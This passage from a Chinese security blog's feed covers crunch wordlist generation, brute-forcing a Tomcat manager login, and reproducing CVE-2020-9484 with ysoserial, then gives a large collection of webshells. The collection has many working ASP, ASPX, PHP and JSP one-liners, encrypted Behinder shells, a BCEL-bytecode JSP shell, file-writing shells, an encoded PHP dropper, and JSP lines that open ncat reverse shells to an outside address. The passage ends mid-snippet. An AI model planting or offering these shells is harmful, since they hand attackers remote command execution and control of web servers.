6000 -z bzip2 #生成长度为6000的bzip2压缩文件</li><li>crunch 4 5 -b 20mib -o START #生成的字典分成多个，前面每个20mb，最后一个小于等于20mb</li><li>crunch 3 3 abc + 123 !@# -t @%^ #Linux必须\转义!，加号（+）是占位符，即生成a1!至c3#</li><li>crunch 3 3 abc + 123 !@# -t ^%@ #Linux必须\转义!，加号（+）是占位符，即生成!1a至#3c</li><li>crunch 4 4  + + 123 + -t %%@^ #即生成11a!至33z[空格]</li><li>字符集：</li><li><ul><li>abcdefghijklmnopqrstuvwxyz</li></ul></li><li><ul><li>ABCDEFGHIJKLMNOPQRSTUVWXYZ</li></ul></li><li><ul><li>123</li></ul></li><li><ul><li>!@#$%^&amp;*()-_+=~`[]{}|:;”‘&lt;&gt;,.?/</li></ul></li><li>crunch 5 5 -t ddd@@ -o j -p dog cat bird #生成birdcatdogaa至dogcatbirdzz</li><li>crunch 7 7 -t p@ss,%^ -l a@aaaaa #生成p@ssA0!至p@ssZ9[空格]</li><li>crunch 5 5 -s @4#S2 -t @%^,2 -e @8\ Q2 -l @dddd -b 10KB -o START #生成长度为5的，以@4#S2开头，@8Q2结尾的字符串，分块成10KB大小的文件，\转义空格</li><li><ul><li>格式：@[数字4至8][符号#至空格][大写字符S至Q]2</li></ul></li><li>crunch 5 5 -d 2@ -t @@@%% #生成aab00至zzy99</li><li>crunch 10 10 -t @@@^%%%%^^ -d 2@ -d 3% -b 20mb -o START #生成aab!0001!!开头，zzy[空格]9998[空格][空格]结尾</li><li>crunch 8 8 -d 2@ #生成aabaabaa至zzyzzyzz</li></ol><h2 id="0xFF"><a href="#0xFF" class="headerlink" title="0xFF"></a>0xFF</h2><p>/usr/share/crunch/charset.lst</p><pre><code># charset configuration file for winrtgen v1.2 by Massimiliano Montoro (mao@oxid.it)# compatible with rainbowcrack 1.1 and later by Zhu Shuanglei &lt;shuanglei@hotmail.com&gt;hex-lower                     = [0123456789abcdef]hex-upper                     = [0123456789ABCDEF]numeric                       = [0123456789]numeric-space                 = [0123456789 ]symbols14                     = [!@#$%^&amp;*()-_+=]symbols14-space               = [!@#$%^&amp;*()-_+= ]symbols-all                   = [!@#$%^&amp;*()-_+=~`[]{}|\:;&quot;&#39;&lt;&gt;,.?/]symbols-all-space             = [!@#$%^&amp;*()-_+=~`[]{}|\:;&quot;&#39;&lt;&gt;,.?/ ]ualpha                        = [ABCDEFGHIJKLMNOPQRSTUVWXYZ]ualpha-space                  = [ABCDEFGHIJKLMNOPQRSTUVWXYZ ]ualpha-numeric                = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]ualpha-numeric-space          = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ]ualpha-numeric-symbol14       = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_+=]ualpha-numeric-symbol14-space = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_+= ]ualpha-numeric-all            = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_+=~`[]{}|\:;&quot;&#39;&lt;&gt;,.?/]ualpha-numeric-all-space      = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_+=~`[]{}|\:;&quot;&#39;&lt;&gt;,.?/ ]lalpha                        = [abcdefghijklmnopqrstuvwxyz]lalpha-space                  = [abcdefghijklmnopqrstuvwxyz ]lalpha-numeric                = [abcdefghijklmnopqrstuvwxyz0123456789]lalpha-numeric-space          = [abcdefghijklmnopqrstuvwxyz0123456789 ]lalpha-numeric-symbol14       = [abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()-_+=]lalpha-numeric-symbol14-space = [abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()-_+= ]lalpha-numeric-all           = [abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()-_+=~`[]{}|\:;&quot;&#39;&lt;&gt;,.?/]lalpha-numeric-all-space      = [abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()-_+=~`[]{}|\:;&quot;&#39;&lt;&gt;,.?/ ]mixalpha                   = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ]mixalpha-space             = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ ]mixalpha-numeric           = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]mixalpha-numeric-space     = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ]mixalpha-numeric-symbol14  = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_+=]mixalpha-numeric-symbol14-space = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_+= ]mixalpha-numeric-all       = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_+=~`[]{}|\:;&quot;&#39;&lt;&gt;,.?/]mixalpha-numeric-all-space = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_+=~`[]{}|\:;&quot;&#39;&lt;&gt;,.?/ ]##########################################################################################                 SWEDISH CHAR-SUPPORT                                                  # ################################################################################################################### Uppercase             ##########################ualpha-sv                        = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ]ualpha-space-sv                  = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ ]ualpha-numeric-sv                = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789]ualpha-numeric-space-sv          = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789 ]ualpha-numeric-symbol14-sv       = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&amp;*()-_+=]ualpha-numeric-symbol14-space-sv = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&amp;*()-_+= ]ualpha-numeric-all-sv            = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&amp;*()-_+=~`[]{}|\:;&quot;&#39;&lt;&gt;,.?/]ualpha-numeric-all-space-sv      = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&amp;*()-_+=~`[]{}|\:;&quot;&#39;&lt;&gt;,.?/ ]########################## Lowercase             ##########################lalpha-sv                        = [abcdefghijklmnopqrstuvwxyzåäö]lalpha-space-sv                  = [abcdefghijklmnopqrstuvwxyzåäö ]lalpha-numeric-sv                = [abcdefghijklmnopqrstuvwxyzåäö0123456789]lalpha-numeric-space-sv          = [abcdefghijklmnopqrstuvwxyzåäö0123456789 ]lalpha-numeric-symbol14-sv       = [abcdefghijklmnopqrstuvwxyzåäö0123456789!@#$%^&amp;*()-_+=]lalpha-numeric-symbol14-space-sv = [abcdefghijklmnopqrstuvwxyzåäö0123456789!@#$%^&amp;*()-_+= ]lalpha-numeric-all-sv            = [abcdefghijklmnopqrstuvwxyzåäö0123456789!@#$%^&amp;*()-_+=~`[]{}|\:;&quot;&#39;&lt;&gt;,.?/]lalpha-numeric-all-space-sv      = [abcdefghijklmnopqrstuvwxyzåäö0123456789!@#$%^&amp;*()-_+=~`[]{}|\:;&quot;&#39;&lt;&gt;,.?/ ]########################## Mixcase               ##########################mixalpha-sv                   = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ]mixalpha-space-sv             = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ ]mixalpha-numeric-sv           = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789]mixalpha-numeric-space-sv     = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789 ]mixalpha-numeric-symbol14-sv  = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&amp;*()-_+=]mixalpha-numeric-symbol14-space-sv = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&amp;*()-_+= ]mixalpha-numeric-all-sv       = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&amp;*()-_+=~`[]{}|\:;&quot;&#39;&lt;&gt;,.?/]mixalpha-numeric-all-space-sv = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&amp;*()-_+=~`[]{}|\:;&quot;&#39;&lt;&gt;,.?/ ]</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat</title>
      <link href="/Tomcat/"/>
      <url>/Tomcat/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-Tomcat"><a href="#0x00-Tomcat" class="headerlink" title="0x00 Tomcat"></a>0x00 Tomcat</h2><h2 id="0x01-burpsuite爆破tomcat后台"><a href="#0x01-burpsuite爆破tomcat后台" class="headerlink" title="0x01 burpsuite爆破tomcat后台"></a>0x01 burpsuite爆破tomcat后台</h2><ol><li>burpsuite开启拦截，访问tomcat后台，随意输入账号密码</li><li><img src="/Tomcat/1.png" alt></li><li>账号密码传输中格式：username:password 的base64编码</li><li><img src="/Tomcat/2.png" alt></li><li>发送到Intruder，划选被base64编码部分并附上§，attack type选sniper</li><li><img src="/Tomcat/3.png" alt></li><li>payload type选custom iterator，自主添加要爆破的账号、密码或者添加账号字典、密码字典，第二个position就是一个冒号（:）</li><li><img src="/Tomcat/4.png" alt></li><li><img src="/Tomcat/5.png" alt></li><li><img src="/Tomcat/6.png" alt></li><li>在payload processing添加规则——编码——base64编码——OK——去掉payload encoding中的URL编码（不勾选）</li><li><img src="/Tomcat/7.png" alt></li><li>爆破</li><li><img src="/Tomcat/8.png" alt></li></ol><h2 id="0x02-war包制作"><a href="#0x02-war包制作" class="headerlink" title="0x02 war包制作"></a>0x02 war包制作</h2><ol><li>切换到XXX.jsp文件所在目录</li><li>jar -cf XXX.war XXX.jsp #就会在同目录下生成XXX.war</li><li><img src="/Tomcat/11.png" alt></li><li>选择XXX.war文件，部署，然后就会生成XXX相对目录</li><li><img src="/Tomcat/10.png" alt></li><li>访问URL/XXX/XXX.jsp</li><li><img src="/Tomcat/9.png" alt></li></ol><h2 id="0x-CVE-2020-9484-Tomcat-RCE复现"><a href="#0x-CVE-2020-9484-Tomcat-RCE复现" class="headerlink" title="0x CVE-2020-9484 Tomcat RCE复现"></a>0x CVE-2020-9484 Tomcat RCE复现</h2><ol><li><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9484" target="_blank" rel="noopener">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9484</a></li><li>环境：</li><li>windows server 2008</li><li>XAMPP tomcat 7.0.103</li><li>影响版本</li><li>&lt;= 10.0.0-M4</li><li>&lt;= 9.0.34</li><li>&lt;= 8.5.54</li><li>&lt;= 7.0.103</li></ol><p><strong>漏洞描述</strong></p><ol><li>在企业级应用中，session一般在服务器内存中。因服务器故障或重启时，session就会全部丢失，为了避免此情况，某些情况下，session就会被保存到文件或数据库中，即session持久化。</li><li>使用了tomcat提供的session持久化功能，如果存在文件上传功能，攻击者可以通过一个流程发起一个恶意请求造成服务器远程命令执行。</li></ol><p><strong>条件</strong></p><ol><li>tomcat/lib或WEB-INF/lib目录下的依赖存在可用的gadget</li><li>存在文件上传功能（任意目录都可以，知道上传后的目录路径及文件后缀必须为.session）</li><li>启用了session持久化功能FileStore（conf/content.xml）</li></ol><pre><code>&lt;Context&gt;    ...    &lt;Manager className=&quot;org.apache.catalina.session.PersistentManager&quot;      debug=&quot;0&quot;      saveOnRestart=&quot;false&quot;      maxActiveSession=&quot;-1&quot;      minIdleSwap=&quot;-1&quot;      maxIdleSwap=&quot;-1&quot;      maxIdleBackup=&quot;-1&quot;&gt;        &lt;Store className=&quot;org.apache.catalina.session.FileStore&quot; directory=&quot;./session&quot; /&gt;    &lt;/Manager&gt;&lt;/Context&gt;</code></pre><p>工具利用</p><ol><li>下载ysoserial，<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></li><li>cd ysoserial</li><li>mvn package -DskipTests #生成工具\target\ysoserial-0.0.6-SNAPSHOT-all.jar</li><li>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 “calc” &gt;1.session #生成commons-collections4依赖的gadget恶意序列化数据</li><li>下载commons-collections4-4.0.jar，<a href="https://www.mvnjar.com/org.apache.commons/commons-collections4/4.0/detail.html" target="_blank" rel="noopener">https://www.mvnjar.com/org.apache.commons/commons-collections4/4.0/detail.html</a>，放到\tomcat\lib\目录下</li><li></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 中间件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webshell</title>
      <link href="/webshell/"/>
      <url>/webshell/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-Webshell"><a href="#0x00-Webshell" class="headerlink" title="0x00 Webshell"></a>0x00 Webshell</h2><p>&ensp;&ensp;&ensp;&ensp;webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。</p><h2 id="0x01-Reference"><a href="#0x01-Reference" class="headerlink" title="0x01 Reference"></a>0x01 Reference</h2><p><a href="https://github.com/search?q=webshell" target="_blank" rel="noopener">https://github.com/search?q=webshell</a><br><a href="https://xz.aliyun.com/t/7798" target="_blank" rel="noopener">https://xz.aliyun.com/t/7798</a></p><h2 id="0x10-互联网搜集的一句话木马"><a href="#0x10-互联网搜集的一句话木马" class="headerlink" title="0x10 互联网搜集的一句话木马"></a>0x10 互联网搜集的一句话木马</h2><p><strong>asp：</strong></p><pre><code>&lt;%response.write(&quot;123&quot;)%&gt; #测试，输出123&lt;%eval request(&quot;test&quot;)%&gt; #密码test&lt;%eval request(123)%&gt; #密码123&lt;%execute(request(&quot;test&quot;))%&gt; #密码test&lt;%execute request(123)%&gt; #密码123&lt;%ExecuteGlobal request(123)%&gt; #密码123&lt;%if request (123)&lt;&gt;&quot;&quot;then session(123)=request(123):end if:if session(123)&lt;&gt;&quot;&quot; then execute session(123)%&gt; #密码123&lt;%eval(request(&quot;test&quot;)):response.end%&gt; #密码test&lt;%execute request(123)%&gt;&lt;%&#39;&lt;%loop&lt;%:%&gt; #密码123&lt;%execute request(123)&#39;&lt;% loop &lt;%:%&gt; #密码123&lt;%&#39;&lt;%loop&lt;%:%&gt;&lt;%execute request(123)%&gt; #密码123&lt;%if Request(&quot;test&quot;)&lt;&gt;&quot;&quot; Then ExecuteGlobal(Request(&quot;test&quot;))%&gt; #密码test&lt;script language=VBScript runat=server&gt;execute request(123)&lt;/script&gt; #密码123&lt;script language=vbs runat=server&gt;eval(request(123))&lt;/script&gt; #密码123&lt;%diy=request(&quot;test&quot;)%&gt;&lt;%Eval(diy)%&gt; #密码test%&gt;&lt;%Eval(Request(chr(49)))%&gt;&lt;% #密码1&lt;%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(&quot;test&quot;))%&gt; #密码test&lt;%execute(strreverse(&quot;)&quot;&quot;test&quot;&quot;(tseuqer lave&quot;))%&gt; #密码test&lt;%     xx=request(&quot;test&quot;)  #密码test    lol=xx     eval lol%&gt; &lt;%     xx=request(&quot;test&quot;)  #密码test    eval xx %&gt;&lt;%     xxx=&quot;e0x0e0c0ut0e(0req0ue0st(&quot;&quot;te0st&quot;&quot;))&quot;  #密码test    xxx=replace(xxx,&quot;0&quot;,&quot;&quot;)     eval xxx %&gt;&lt;%    Function MorfiCoder(Code)    MorfiCoder=Replace(Replace(StrReverse(Code),&quot;/*/&quot;,&quot;&quot;&quot;&quot;),&quot;\*\&quot;,vbCrlf)    End Function    Execute MorfiCoder(&quot;)/*/test/*/(tseuqer lave&quot;) #密码test%&gt;&lt;%     dim x1,x2     x1 = request(&quot;pass&quot;)     x2 = x1     eval x2 %&gt; </code></pre><p><strong>aspx：</strong></p><pre><code>&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[&quot;x&quot;],”unsafe”);%&gt;</code></pre><p><strong>php：</strong></p><pre><code>&lt;?php eval($_POST[1])?&gt;&lt;?php @eval($_POST[2])?&gt;&lt;?php eval($_POST[&#39;3&#39;])?&gt;&lt;?php eval($_POST[&quot;4&quot;])?&gt;&lt;?php if(isset($_POST[1])){eval($_POST[1]);}?&gt;&lt;?php ($_=@$_GET[&quot;qwe&quot;]).@$_($_POST[&quot;asd&quot;]);?&gt; #qwe=system，asd=whoami&lt;?php assert($_POST[1]);?&gt;&lt;?$_POST[&#39;c&#39;]($_POST[&#39;cc&#39;]);?&gt;&lt;?$_POST[&#39;c&#39;]($_POST[&#39;cc&#39;],$_POST[&#39;ccc&#39;])?&gt;&lt;?php assert(eval($_POST[cmd]));?&gt;&lt;?php @preg_replace(&quot;/[email]/e&quot;,$_POST[&#39;h&#39;],&quot;error&quot;);?&gt; #密码h配置填：&lt;O&gt;h=@eval_r($_POST[1]);&lt;/O&gt;&lt;?php $_GET[a]($_GET[b]);?&gt;http://192.168.100.3/11.php?a=assert&amp;b=${fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x))};&lt;script language=&quot;php&quot;&gt;@eval($_POST[123])&lt;/script&gt; #密码123&lt;?=eval($_POST[&#39;test&#39;]); #密码test&lt;?php eval(str_rot13(&#39;riny($_CBFG[123]);&#39;));?&gt; #无GET、POST，密码123&lt;?php system($_REQUEST[&#39;cmd&#39;]);?&gt; #简单命令执行</code></pre><p><strong>JSP：</strong></p><ol><li>无回显版命令执行，反弹shell：<strong>shell.jsp</strong></li><li>&lt;%Runtime.getRuntime().exec(request.getParameter(“cmd”));%&gt;</li><li><a href="http://192.168.100.3:8080/shell.jsp?cmd=ncat" target="_blank" rel="noopener">http://192.168.100.3:8080/shell.jsp?cmd=ncat</a> 192.168.100.1 6666 -e cmd #前提是已安装nmap</li></ol><p>直接反弹shell与直向shell：<br>3. &lt;%Runtime.getRuntime().exec(“ncat remote_IP remote_port -e cmd.exe”);%&gt; #windows版利用ncat反弹shell，ncat -lvp local_port<br>4. &lt;%Runtime.getRuntime().exec(“ncat -lvp local_port -e cmd.exe”);%&gt; ##windows版利用ncat直向shell，ncat remote_IP remote_port</p><pre><code>&lt;%    if(&quot;password&quot;.equals(request.getParameter(&quot;pwd&quot;))){        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream();        int a = -1;        byte[] b = new byte[2048];        out.print(&quot;&lt;pre&gt;&quot;);        while((a=in.read(b))!=-1){            out.println(new String(b));        }        out.print(&quot;&lt;/pre&gt;&quot;);    }%&gt;</code></pre><ol><li>回显版命令执行</li><li><a href="http://192.168.100.3:8080/shell.jsp?pwd=password&amp;cmd=whoami" target="_blank" rel="noopener">http://192.168.100.3:8080/shell.jsp?pwd=password&amp;cmd=whoami</a></li></ol><pre><code>&lt;%new java.io.FileOutputStream(request.getParameter(&quot;filepath&quot;)).write(request.getParameter(&quot;str&quot;).getBytes());%&gt;&lt;%new java.io.RandomAccessFile(request.getParameter(&quot;filepath&quot;),&quot;rw&quot;).write(request.getParameter(&quot;str&quot;).getBytes()); %&gt;</code></pre><ol><li>写123到指定目录文件</li><li><a href="http://192.168.100.3:8080/shell.jsp?filepath=c:/update.jsp&amp;str=123" target="_blank" rel="noopener">http://192.168.100.3:8080/shell.jsp?filepath=c:/update.jsp&amp;str=123</a></li></ol><pre><code>&lt;%new java.io.FileOutputStream(application.getRealPath(&quot;/&quot;)+&quot;/&quot;+request.getParameter(&quot;filepath&quot;)).write(request.getParameter(&quot;str&quot;).getBytes());%&gt;&lt;%new java.io.RandomAccessFile(application.getRealPath(&quot;/&quot;)+&quot;/&quot;+request.getParameter(&quot;filepath&quot;),&quot;rw&quot;).write(request.getParameter(&quot;str&quot;).getBytes()); %&gt;</code></pre><ol><li>写123到web目录文件</li><li><a href="http://192.168.100.3:8080/shell.jsp?filepath=123.txt&amp;str=123" target="_blank" rel="noopener">http://192.168.100.3:8080/shell.jsp?filepath=123.txt&amp;str=123</a></li></ol><h2 id="0x20-冰蝎木马"><a href="#0x20-冰蝎木马" class="headerlink" title="0x20 冰蝎木马"></a>0x20 冰蝎木马</h2><p><strong>PHP</strong></p><pre><code>&lt;?php@error_reporting(0);session_start();if (isset($_GET[&#39;pass&#39;])){    $key=substr(md5(uniqid(rand())),16);    $_SESSION[&#39;k&#39;]=$key;    print $key;}else{    $key=$_SESSION[&#39;k&#39;];    $post=file_get_contents(&quot;php://input&quot;);    if(!extension_loaded(&#39;openssl&#39;))    {        $t=&quot;base64_&quot;.&quot;decode&quot;;        $post=$t($post.&quot;&quot;);        for($i=0;$i&lt;strlen($post);$i++) {                 $post[$i] = $post[$i]^$key[$i+1&amp;15];                 }    }    else    {        $post=openssl_decrypt($post, &quot;AES128&quot;, $key);    }    $arr=explode(&#39;|&#39;,$post);    $func=$arr[0];    $params=$arr[1];    class {public function __construct($p) {eval($p.&quot;&quot;);}}    @new C($params);}?&gt;</code></pre><p><strong>JSP</strong></p><pre><code>&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if(request.getParameter(&quot;pass&quot;)!=null){String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;}Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;</code></pre><p><strong>aspx</strong></p><pre><code>&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;%@Import Namespace=&quot;System.Reflection&quot;%&gt;&lt;%if (Request[&quot;pass&quot;]!=null){ Session.Add(&quot;k&quot;, Guid.NewGuid().ToString().Replace(&quot;-&quot;, &quot;&quot;).Substring(16)); Response.Write(Session[0]); return;}byte[] k = Encoding.Default.GetBytes(Session[0] + &quot;&quot;),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(&quot;U&quot;).Equals(this);%&gt;</code></pre><h2 id="0x30-JSP"><a href="#0x30-JSP" class="headerlink" title="0x30 JSP"></a>0x30 JSP</h2><ol><li><a href="http://IP/shell.jsp?cmd=whoami" target="_blank" rel="noopener">http://IP/shell.jsp?cmd=whoami</a></li></ol><p><strong>使用BCEL字节码的JSP Webshell</strong></p><pre><code>&lt;%@ page import=&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot; %&gt;&lt;html&gt;&lt;body&gt;&lt;h2&gt;BCEL字节码的JSP Webshell&lt;/h2&gt;&lt;%    String bcelCode = &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85U$5bW$hU$U$fe$86$ML$Y$a6$40$93r$d5$e2$8d$dap$ebh$eb$a5$96$8a6$I$V$N$X$81$82$Uo$93$c9$n$M$9d$cc$c4$c9$a4$82w$fd$N$fe$H_$adKC$97$b8$7c$f4$c1G$7f$86$bf$c1e$fd$ce$q$40b$c2$f2a$ce$99$b3$f7$9e$bd$bf$fd$ed$bd$cf$fc$f1$cf$_$bf$Bx$B$df$ea$Y$c6$8c$86$d7t$b4$c9$fdu$N$b7t$a41$x$977t$cca$5eG$3bn$ebP$f1$a6$5c$W$a4$e1$5bq$bc$z$f7L$tz$b1$a8aI$c72V$e2xG$c7$w$d6t$ac$e3$8e$5c6tl$e2$ddNl$e1n$i$db$3a$de$c3$fb$g$3eP$Q$LDIA$o$b3g$dd$b7L$d7$f2$f2$e6Z$Y8$5e$7eZA$c7M$c7s$c2$Z$F$7d$a9f$f5$d8$86$Cu$d6$cf$J$F$3d$Z$c7$TK$e5BV$E$ebV$d6$V$d2$9do$5b$ee$86$V8$f2$5c$T$aa$e1$ae$c3P$X2$eb$bb$81$Q$b9$e0$9aU$d8$U$d9$b5$5d$e1$ba$M$W$b3$L9$F$e7J$91$f7t$d9qs$oP0$d4$U$b8$a6$e2$X$dd$d9$f2$ce$8e$IDnUX$91$f1$60$d5$d8$f1$cdt$83$86$b6$aaK$88t$bf$WZ$f6$bdE$ab$YA$oW$g$3e$q$df$a4Z$81$3e$b7o$8bb$e8$f8$5eI$c3G$K$e2$a1_$8dH$c8$a9$b1V$fc$a8$F$cb$f1$U$f4$a7$b6$cf$a0$c7$K$f2L8$d9B$ad$a0$cb$f1$8a$e5$90Ga$V$c8$f0$J$f4$85S1$ad$da$b3$H$a1$acO$dbv$9a$fe$ec$88n$7d$cd$_$H$b6$98w$q$a9$D$cdd$5e$91$ae$M$5c$84E$f5$Z$f4$Ruk$aeHy$L$qU$9d$86$ac$B$h9$D$C$3b$g$f2$Gv$e1$c8$40$7br$b9g$c0$c5U$D$F$90$TE7$f0$bc$3c$3d$86$c7$d9$O$cd$m5$f8$G$8a$f8$98Uk$91$81$edZ$rV$n0PB$a8$a1l$e0$3e$3e1$b0$8f$D$N$9f$g$f8$M$9fk$f8$c2$c0$97$f8$8au$g$jM$cf$ceeFG5$7cm$e0$h$8c$u$e8$3d$cdz9$bb$t$ec$b0At$5c$d5$e4I$a2$cb$t$a5g$l$a6d$e9$ce$9f$9a$af$96$bd$d0$vH$de$f3$o$3c9$f45$b4DM$y$7bB$ec$L$5b$c1$e5V$TS$tZ$J$7c$5b$94J$d3$N$91jBv6$p$z$d4$b7$c7$c0q$b4$a6$G$ZL$b5T$c8$i$92$a7$aa$da$iHi$9c$fa$5c$s$9a$86$O$abX$U$k$a7n$ea$7f$d0$few$f2zNU$b3$b2RU$c4$d1k$c6$afuQ$D$3fu$w$7e$de$d7RA$c0$92$60Q$8a$ba$fbV$e98$f7$b1$b3$c15$b1$91l$nV$d0I$a1$e3V$_$n$96w$81U$92$qp$baR$dbiy$bcj$fb$F$b3T$f6L$3f$c8$9bV$d1$b2w$85$99$b5$85k$3a$5e$u$C$cfr$cd$a8$nw8q$e6$9d$d0q$9d$f0$80$ec$J$af$3a$8f$D$f4r$b7$e5$FQ$dft$H$a5P$QK$cc$_$87$f5$e3$beB$d3$W$f8$eb$c4$K$b4$a2$3c$b9$k$9e$e2$N$3f$cc_$85$c2$87$83$c55$c6$f7$8b$Y$e1$f5$ff$EO$7f$a2$83$ff$H$e0$f6$f8$n$94$p$b4m$j$o$b6x$Eu$eb$I$ed$5b$P$d11Q$81VA$fc$Q$9d$87$d0$97$a6$w$e8$da$ba$a1$fe$8e$c4$e4$90Z$81$918$c7e$f3$fbG$7f$8dOV$d0$fd3z$kD$B$9e$e4$3a$C$8dk7$7f9$3d0$I$e2$S$S0$91$c4$M$fa0$8f$7e$C$93$ff$af$u4$9e$c63$40$f46J$88$K$ed$a7i$ff$y$n$5e$a2$ee2R$f49I$f8c$d4$aa$Y$8fRi$7bD$a5$aaaB$c3$a4$86$v$NW$80$bf1$c8$T$c3$80f$K$9e$e3$c3$h$85$ab$cc$d4$e4$$Yh$l$ff$J$3d$3f$f0$a5$z$c2$d9$R$J$87$p$3cF$d5$a0$86$a7$T$d7$88$b0J$d3wD$a0r$bf$9e$e8$ad$e0$7c$oQA2Cj$$$fc$g_$9c$60$ea$7d$9b$93$eaC$f4$_$fd$88$81$g$87$89A2C$ba$M$f2R$c1$d0$83$93x$c3$8c$u$d9$e9$a2$df$E$r$83$8c$3c$c2$88$_3$a6$c40$5e$8d$83$X$f1$S$f7$$LQs$9d$b8$S$e4$e3$V$dc$a0$97$R$fa$98$s$T$b1$86DoF$R$5e$fd$X$cb$B$rU$g$I$A$A&quot;;    response.getOutputStream().write(String.valueOf(new ClassLoader().loadClass(bcelCode).getConstructor(String.class).newInstance(request.getParameter(&quot;cmd&quot;)).toString()).getBytes());%&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>使用自定义类加载器的JSP Webshell</strong></p><pre><code>&lt;%@ page import=&quot;java.security.PermissionCollection&quot; %&gt;&lt;%@ page import=&quot;java.security.Permissions&quot; %&gt;&lt;%@ page import=&quot;java.security.AllPermission&quot; %&gt;&lt;%@ page import=&quot;java.security.ProtectionDomain&quot; %&gt;&lt;%@ page import=&quot;java.security.CodeSource&quot; %&gt;&lt;%@ page import=&quot;java.security.cert.Certificate&quot; %&gt;&lt;%@ page import=&quot;java.util.Base64&quot; %&gt;&lt;html&gt;&lt;body&gt;&lt;h2&gt;自定义类加载器的JSP Webshell&lt;/h2&gt;&lt;%    